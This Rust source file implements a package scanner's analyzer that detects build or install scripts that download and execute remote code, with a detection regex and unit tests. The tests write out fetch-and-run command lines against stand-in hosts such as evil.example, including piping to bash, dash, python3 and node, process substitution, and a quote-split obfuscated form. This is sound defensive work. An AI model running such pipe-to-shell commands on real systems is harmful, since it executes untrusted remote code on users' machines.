//! Remote-execution boundary detection.
//!
//! A package can keep its malicious payload *outside* any package by fetching
//! and running code from an external URL at build/install time. The scanner
//! deliberately does **not** follow that reference: downloading or running it
//! would turn the scanner itself into the execution vector, and the dependency
//! graph / SBOM would be chasing attacker-controlled code.
//!
//! Instead this analyzer detects the fetch-and-execute, extracts the URL(s),
//! and emits a loud finding. Downstream, such a package is marked as an
//! **opaque boundary**: the SBOM cannot account for what runs beyond it, by
//! design -- the correct message to the user is "this runs code from <url>,
//! you probably don't want that", not a fabricated "complete" SBOM.

use super::SecurityAnalyzer;
use crate::error::Result;
use crate::rules::informational_lines;
use crate::textutil::{
    deobfuscate, logical_lines, INTERPRETERS, SHELLS, SHELL_LAUNCHER, SHELL_PATH,
};
use crate::types::{AnalysisContext, Category, Finding, Location, Severity};
use async_trait::async_trait;
use lazy_static::lazy_static;
use regex::Regex;

lazy_static! {
    /// A line that downloads and immediately executes remote content.
    ///
    /// The shell/interpreter sinks come from the shared `SHELLS`/`INTERPRETERS`
    /// constants so every detector recognizes the same set -- notably `dash`,
    /// which the previous inline `(ba|z|k|c|d|tc|fi)?sh` could never match
    /// (`d?sh` is `dsh`/`sh`, not `dash`), letting `curl evil | dash` evade this
    /// analyzer entirely (defect #6).
    static ref FETCH_EXEC: Regex = Regex::new(&format!(
        r#"(?x)
        (curl|wget|aria2c|fetch)\b[^\n]*\|\s*{SHELL_LAUNCHER}{SHELL_PATH}\b{SHELLS}\b          # download | [launcher][path] shell
        | (curl|wget|aria2c|fetch)\b[^\n]*\|\s*{SHELL_LAUNCHER}{SHELL_PATH}\b{INTERPRETERS}\b  # download | [launcher][path] interpreter
        | {SHELL_LAUNCHER}{SHELL_PATH}\b{SHELLS}\b\s+<\(\s*(curl|wget|fetch)\b                 # [launcher][path] sh <(curl ...)
        | source\s+<\(\s*(curl|wget|fetch)\b                         # source <(curl ...)
        | \beval\s+["']?\$\(\s*(curl|wget|fetch)\b                   # eval "$(curl ...)"
        | \.\s+<\(\s*(curl|wget|fetch)\b                             # . <(curl ...)
        "#
    )).unwrap();
    /// Extract http(s) URLs (stop at shell/quote boundaries).
    static ref URL: Regex = Regex::new(r#"https?://[^\s"'`|)><(]+"#).unwrap();
}

/// Trim trailing shell punctuation a URL regex may capture.
fn clean_url(u: &str) -> String {
    u.trim_end_matches([';', '&', ',', '.', '\\', '}']).to_string()
}

/// Detects remote fetch-and-execute and extracts the external URL(s).
pub struct RemoteExecAnalyzer;

impl RemoteExecAnalyzer {
    /// Create a new analyzer.
    pub fn new() -> Self {
        Self
    }

    fn scan(&self, text: &str, file: &std::path::Path, in_install: bool) -> Vec<Finding> {
        let mut findings = Vec::new();
        // Splice backslash-newline continuations so `curl evil \`<nl>`| sh`
        // cannot escape the fetch-exec pattern by living on two physical lines.
        let lines = logical_lines(text);
        // Skip lines that are printed text rather than executed code (a
        // non-redirected heredoc body or a pure `echo`/`msg "..."` print), using
        // the same pre-filter the rule engine and privilege analyzer use, so a
        // package that merely DOCUMENTS a `curl ... | sh` example does not raise
        // EXEC-REMOTE.
        let line_strs: Vec<&str> = lines.iter().map(|(_, s)| s.as_str()).collect();
        let informational = informational_lines(&line_strs);
        for (idx_l, (phys_line, line)) in lines.iter().enumerate() {
            let line = line.as_str();
            let trimmed = line.trim_start();
            if trimmed.starts_with('#') || informational[idx_l] {
                continue;
            }
            // Match the raw line, and -- so character-level obfuscation can't
            // hide the fetch|exec -- its de-obfuscated form too (defect #6c).
            // URLs are extracted from whichever variant matched so a decoded
            // payload reports the real URL, not the obfuscated source text.
            let decoded = deobfuscate(line);
            let scan_line = if FETCH_EXEC.is_match(line) {
                line
            } else if decoded.as_deref().is_some_and(|d| FETCH_EXEC.is_match(d)) {
                decoded.as_deref().unwrap()
            } else {
                continue;
            };
            let idx = phys_line - 1;
            let urls: Vec<String> =
                URL.find_iter(scan_line).map(|m| clean_url(m.as_str())).collect();
            let where_ = if in_install { " (install script)" } else { "" };
            let url_msg = if urls.is_empty() {
                "an external source".to_string()
            } else {
                urls.join(", ")
            };

            findings.push(Finding {
                id: "EXEC-REMOTE".to_string(),
                severity: Severity::Critical,
                category: Category::MaliciousCode,
                title: format!("Fetches and runs code from {url_msg}{where_}"),
                description: format!(
                    "This package downloads and executes code from {url_msg} at build/install \
                     time. The scanner does NOT follow this reference (doing so could run the \
                     remote code), so what actually executes is unknown -- treat it as untrusted. \
                     The dependency tree/SBOM cannot account for code fetched at runtime."
                ),
                location: Location {
                    file: file.to_path_buf(),
                    line: Some(idx + 1),
                    column: None,
                    snippet: Some(scan_line.trim().to_string()),
                },
                recommendation:
                    "Do not build. A package that pulls and runs code from an external URL is \
                     opaque by design; obtain the software from a source that ships its real code."
                        .to_string(),
                cwe_id: Some("CWE-494".to_string()),
                metadata: serde_json::json!({
                    "remote_urls": urls,
                    "opaque_boundary": true,
                }),
            });
        }
        findings
    }
}

impl Default for RemoteExecAnalyzer {
    fn default() -> Self {
        Self::new()
    }
}

#[async_trait]
impl SecurityAnalyzer for RemoteExecAnalyzer {
    async fn analyze(&self, context: &AnalysisContext) -> Result<Vec<Finding>> {
        let mut findings = self.scan(&context.pkgbuild.raw_content, &context.file_path, false);
        if let Some(install) = &context.install_script {
            findings.extend(self.scan(&install.content, &install.path, true));
        }
        Ok(findings)
    }

    fn name(&self) -> &str {
        "remote_exec"
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::Path;

    #[test]
    fn detects_curl_pipe_sh_and_extracts_url() {
        let a = RemoteExecAnalyzer::new();
        let f = a.scan(
            "build() {\n  curl -fsSL https://evil.example/x.sh | bash\n}",
            Path::new("PKGBUILD"),
            false,
        );
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].id, "EXEC-REMOTE");
        let urls = f[0].metadata["remote_urls"].as_array().unwrap();
        assert_eq!(urls[0], "https://evil.example/x.sh");
    }

    #[test]
    fn detects_process_substitution() {
        let a = RemoteExecAnalyzer::new();
        let f = a.scan("bash <(curl -s https://x.io/i)", Path::new("PKGBUILD"), false);
        assert!(f.iter().any(|x| x.id == "EXEC-REMOTE"));
    }

    #[test]
    fn detects_continuation_split_fetch_exec() {
        // CR-3: the pipe-to-shell is on a backslash-continuation line.
        let a = RemoteExecAnalyzer::new();
        let f = a.scan(
            "build() {\n  curl -fsSL https://evil.example/x \\\n    | bash\n}",
            Path::new("PKGBUILD"),
            false,
        );
        assert!(f.iter().any(|x| x.id == "EXEC-REMOTE"), "continuation-split fetch|exec must be caught");
    }

    #[test]
    fn detects_curl_pipe_dash() {
        // Defect #6: `dash` was matched nowhere. `curl ... | dash` must now fire.
        let a = RemoteExecAnalyzer::new();
        let f = a.scan(
            "curl -fsSL https://evil.example/x.sh | dash",
            Path::new("PKGBUILD"),
            false,
        );
        assert!(f.iter().any(|x| x.id == "EXEC-REMOTE"), "curl|dash must be caught");
    }

    #[test]
    fn detects_curl_pipe_ash() {
        // Task 4050 F2: ash is a SHELLS member now — `curl ... | ash` must fire.
        let a = RemoteExecAnalyzer::new();
        let f = a.scan(
            "curl -fsSL https://evil.example/x.sh | ash",
            Path::new("PKGBUILD"),
            false,
        );
        assert!(f.iter().any(|x| x.id == "EXEC-REMOTE"), "curl|ash must be caught");
    }

    #[test]
    fn detects_launcher_path_and_interpreter_fetch_exec() {
        // Task 4050 exhaustive scope: path-prefixed shells (`/bin/sh`),
        // path+launcher (`/usr/bin/env sh`), path interpreters
        // (`/usr/bin/python3`), and the expanded interpreter set must all trip
        // EXEC-REMOTE.
        let a = RemoteExecAnalyzer::new();
        for cmd in [
            "curl -fsSL https://evil.example/x.sh | /bin/sh",
            "curl -fsSL https://evil.example/x.sh | busybox sh",
            "curl -fsSL https://evil.example/x.sh | /usr/bin/env sh",
            "curl -fsSL https://evil.example/x.sh | command busybox sh",
            "busybox sh <(curl -s https://evil.example/i)",
            // interpreters (expanded set + path)
            "curl -fsSL https://evil.example/x | /usr/bin/python3 -",
            "curl -fsSL https://evil.example/x | node",
            "curl -fsSL https://evil.example/x | deno run -",
            "curl -fsSL https://evil.example/x | env python3",
        ] {
            let f = a.scan(cmd, Path::new("PKGBUILD"), false);
            assert!(
                f.iter().any(|x| x.id == "EXEC-REMOTE"),
                "launcher/path/interpreter fetch|exec must be caught: {cmd} -> {f:?}"
            );
        }
    }

    #[test]
    fn fetch_exec_no_fp_on_non_shell_pipe_target() {
        // The path/launcher generalization must not flag a fetch piped to a
        // non-shell, non-interpreter command.
        let a = RemoteExecAnalyzer::new();
        for cmd in [
            "curl -fsSL https://example.com/x | /usr/bin/tee out",
            "curl -fsSL https://example.com/x | env grep foo",
            "curl -fsSL https://example.com/x | busybox cat",
        ] {
            let f = a.scan(cmd, Path::new("PKGBUILD"), false);
            assert!(f.is_empty(), "non-shell pipe target must not fire EXEC-REMOTE: {cmd} -> {f:?}");
        }
    }

    #[test]
    fn documented_fetch_exec_in_printed_heredoc_not_flagged() {
        // Task 4050a: a `curl ... | sh` that only appears inside a printed
        // (non-redirected) heredoc is documentation, not execution — must not
        // raise EXEC-REMOTE.
        let a = RemoteExecAnalyzer::new();
        let f = a.scan(
            "post_install() {\n  cat <<EOF\n  To set up, run: curl -fsSL https://x.io/i.sh | sh\nEOF\n}",
            Path::new("test.install"),
            true,
        );
        assert!(
            f.is_empty(),
            "documented curl|sh in a printed heredoc must not fire EXEC-REMOTE: {f:?}"
        );
    }

    #[test]
    fn detects_obfuscated_fetch_exec() {
        // Defect #6c: a quote-split `"cu""rl" ... | sh` must be caught via
        // de-obfuscation, and the real URL extracted from the decoded form.
        let a = RemoteExecAnalyzer::new();
        let f = a.scan(
            r#""cu""rl" -fsSL https://evil.example/x.sh | sh"#,
            Path::new("PKGBUILD"),
            false,
        );
        assert_eq!(f.len(), 1, "obfuscated fetch|exec must be caught: {f:?}");
        let urls = f[0].metadata["remote_urls"].as_array().unwrap();
        assert_eq!(urls[0], "https://evil.example/x.sh");
    }

    #[test]
    fn ignores_plain_download_without_exec() {
        // A source download (no exec) must not be flagged here; that's normal.
        let a = RemoteExecAnalyzer::new();
        let f = a.scan("curl -O https://example.com/src.tar.gz", Path::new("PKGBUILD"), false);
        assert!(f.is_empty());
    }
}
